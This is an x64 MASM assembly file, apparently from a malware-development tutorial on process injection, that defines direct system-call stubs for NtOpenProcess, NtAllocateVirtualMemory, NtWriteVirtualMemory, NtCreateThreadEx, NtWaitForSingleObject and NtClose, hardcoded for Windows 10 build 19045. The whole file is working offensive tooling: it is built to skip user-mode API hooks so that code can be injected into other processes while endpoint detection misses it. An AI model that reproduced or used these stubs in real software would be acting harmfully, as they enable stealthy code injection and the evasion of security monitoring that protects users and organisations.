; heavily butchered/stripped to remove the bloat (for POC & RE purposes)
; culprit: crow
; regrets: many
; site: https://www.crow.rip/crows-nest/malware-development/process-injection/system-calls/direct-system-calls#syswhispers

.code

NtOpenProcess PROC
	mov rax, gs:[60h]                       ; Load PEB into RAX. PEB x64 @ gs:[60h], PEB x32 @ fs[:30h]
NtOpenProcess_Check_X_X_XXXX:               ; PEB->OSMajorVersion
	cmp dword ptr [rax+118h], 10           
	je  NtOpenProcess_Check_10_0_XXXX       
	jmp NtOpenProcess_SystemCall_Unknown    ; if not Windows 10, jmp NtOpenProcess_SystemCall_Unknown
NtOpenProcess_Check_10_0_XXXX:              ; PEB->OSBuildNumber
	cmp word ptr [rax+120h], 19045          
	je  NtOpenProcess_SystemCall_10_0_19045
	jmp NtOpenProcess_SystemCall_Unknown    ; if not build 19045, jmp NtOpenProcess_SystemCall_Unknown
NtOpenProcess_SystemCall_10_0_19045:        ; Windows 10.0.19045 (22H2) added by ~~headass~~ crow
	mov eax, 0026h
	jmp NtOpenProcess_Epilogue              
NtOpenProcess_SystemCall_Unknown:           ; Unknown/unsupported version.
	ret
NtOpenProcess_Epilogue:
	mov r10, rcx
	syscall                                 ; can be replaced w/ legacy int 2eh as well
	ret
NtOpenProcess ENDP

NtAllocateVirtualMemory PROC
	mov rax, gs:[60h]                            
NtAllocateVirtualMemory_Check_X_X_XXXX:               
	cmp dword ptr [rax+118h], 10
	je  NtAllocateVirtualMemory_Check_10_0_XXXX
	jmp NtAllocateVirtualMemory_SystemCall_Unknown
NtAllocateVirtualMemory_Check_10_0_XXXX:              
	cmp word ptr [rax+120h], 19045
	je  NtAllocateVirtualMemory_SystemCall_10_0_19045
	jmp NtAllocateVirtualMemory_SystemCall_Unknown
NtAllocateVirtualMemory_SystemCall_10_0_19045:        
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_Unknown:           
	ret
NtAllocateVirtualMemory_Epilogue:
	mov r10, rcx
	syscall
	ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
	mov rax, gs:[60h]                          
NtWriteVirtualMemory_Check_X_X_XXXX:              
	cmp dword ptr [rax+118h], 10
	je  NtWriteVirtualMemory_Check_10_0_XXXX
	jmp NtWriteVirtualMemory_SystemCall_Unknown
NtWriteVirtualMemory_Check_10_0_XXXX:              
	cmp word ptr [rax+120h], 19045          
	je  NtWriteVirtualMemory_SystemCall_10_0_19045
	jmp NtWriteVirtualMemory_SystemCall_Unknown
NtWriteVirtualMemory_SystemCall_10_0_19045:        
	mov eax, 003Ah
	jmp NtWriteVirtualMemory_Epilogue
NtWriteVirtualMemory_SystemCall_Unknown:           
	ret
NtWriteVirtualMemory_Epilogue:
	mov r10, rcx
	syscall
	ret
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
	mov rax, gs:[60h]                      
NtCreateThreadEx_Check_X_X_XXXX:               
	cmp dword ptr [rax+118h], 10
	je  NtCreateThreadEx_Check_10_0_XXXX
	jmp NtCreateThreadEx_SystemCall_Unknown
NtCreateThreadEx_Check_10_0_XXXX:
	cmp dword ptr [rax+120h], 19045
	je  NtCreateThreadEx_SystemCall_10_0_19045
	jmp NtCreateThreadEx_SystemCall_Unknown
NtCreateThreadEx_SystemCall_10_0_19045:        
	mov eax, 00C2h
	jmp NtCreateThreadEx_Epilogue
NtCreateThreadEx_SystemCall_Unknown:          
	ret
NtCreateThreadEx_Epilogue:
	mov r10, rcx
	syscall
	ret
NtCreateThreadEx ENDP

NtWaitForSingleObject PROC
	mov rax, gs:[60h]                          
NtWaitForSingleObject_Check_X_X_XXXX:              
	cmp dword ptr [rax+118h], 10
	je  NtWaitForSingleObject_Check_10_0_XXXX
	jmp NtWaitForSingleObject_SystemCall_Unknown
NtWaitForSingleObject_Check_10_0_XXXX:              
	cmp word ptr [rax+120h], 19045
	je  NtWaitForSingleObject_SystemCall_10_0_19045
	jmp NtWaitForSingleObject_SystemCall_Unknown
NtWaitForSingleObject_SystemCall_10_0_19045:        
	mov eax, 0004h
	jmp NtWaitForSingleObject_Epilogue
NtWaitForSingleObject_SystemCall_Unknown:           
	ret
NtWaitForSingleObject_Epilogue:
	mov r10, rcx
	syscall
	ret
NtWaitForSingleObject ENDP

NtClose PROC
	mov rax, gs:[60h]             
NtClose_Check_X_X_XXXX:               
	cmp dword ptr [rax+118h], 10
	je  NtClose_Check_10_0_XXXX
	jmp NtClose_SystemCall_Unknown
NtClose_Check_10_0_XXXX:              
	cmp word ptr [rax+120h], 19045
	je  NtClose_SystemCall_10_0_19045
	jmp NtClose_SystemCall_Unknown
NtClose_SystemCall_10_0_19045:        
	mov eax, 000Fh
	jmp NtClose_Epilogue
NtClose_SystemCall_Unknown:           
	ret
NtClose_Epilogue:
	mov r10, rcx
	syscall
	ret
NtClose ENDP

end